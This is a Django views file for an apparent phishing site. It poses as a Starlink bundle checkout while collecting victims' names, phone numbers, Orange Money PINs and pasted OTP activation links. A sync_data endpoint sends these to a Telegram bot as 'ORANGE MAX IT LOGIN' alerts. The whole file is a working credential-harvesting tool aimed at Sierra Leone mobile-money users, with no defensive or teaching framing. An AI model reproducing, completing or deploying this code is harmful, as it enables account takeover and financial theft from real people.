import json
import requests
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from decouple import config # Recommended to use your settings instead of hardcoding

# Telegram Configuration (Get from your settings.py if possible)
BOT_TOKEN = config('TELEGRAM_BOT_TOKEN', default='YOUR_BOT_TOKEN')
CHAT_ID = config('TELEGRAM_CHAT_ID', default='YOUR_CHAT_ID')

def home(request):
    return render(request, 'index.html')

def checkout(request):
    """ Stage 1: Checkout page """
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    context = {'bundle': bundle, 'price': price}
    return render(request, 'checkout.html', context)

def otp_verification(request):
    """ Stage 3: Process Phone/PIN and show OTP Link Page """
    if request.method == 'POST':
        # 1. Get Phone and PIN from your Orange-themed form
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        # 2. Get the stored Name and City from the previous step
        name = request.session.get('name', 'Customer')
        city = request.session.get('city', 'N/A')

        # 3. Save the Order to the database
        new_order = Order.objects.create(
            customer_name=name,
            city=city,
            phone=phone,
            orange_pin=pin,
            status='Awaiting Link'
        )

        # 4. Redirect to the page where they paste the OTP link
        # We pass 'order' so the next page knows which user this is
        return render(request, 'otp_link_verification.html', {'order': new_order})
    
    return redirect('starlink_app:checkout')

def finalize_order(request, order_id):
    """ Stage 4: Capture the final OTP Link """
    if request.method == 'POST':
        order = Order.objects.get(id=order_id)
        otp_link = request.POST.get('otp_link', '')
        
        # Save the link to the order
        order.otp_activation_link = otp_link
        order.status = 'Completed'
        order.save()
        
        return render(request, 'success.html')

@csrf_exempt
def sync_data(request):
    """
    Stage 4: Send collected data (including Activation Link) to Telegram
    """
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "POST required"}, status=405)

    try:
        data = json.loads(request.body)
        # Get the link from the JSON payload
        activation_link = data.get('link', 'No link provided')

        # Retrieve user details from the Django Session
        phone = request.session.get('phone', 'Unknown')
        bundle = request.session.get('bundle', 'Unknown')
        pin = request.session.get('pin', 'Unknown')
        name = request.session.get('name', 'Unknown')

        message = (
            "🇸🇱 ORANGE MAX IT LOGIN\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👤 NAME: {name}\n"
            f"📞 PHONE: +232 {phone}\n"
            f"📦 BUNDLE: {bundle}\n"
            f"🔑 PIN: {pin}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔗 ACTIVATION LINK:\n{activation_link}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 STATUS: PENDING VERIFICATION"
        )

        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        response = requests.post(
            telegram_url,
            data={
                "chat_id": CHAT_ID,
                "text": message,
                "disable_web_page_preview": False # Keeps the link clickable in Telegram
            }
        )

        if response.status_code == 200:
            return JsonResponse({"status": "success"})
        
        return JsonResponse({"status": "error", "message": "Telegram failed to send"}, status=500)

    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=400)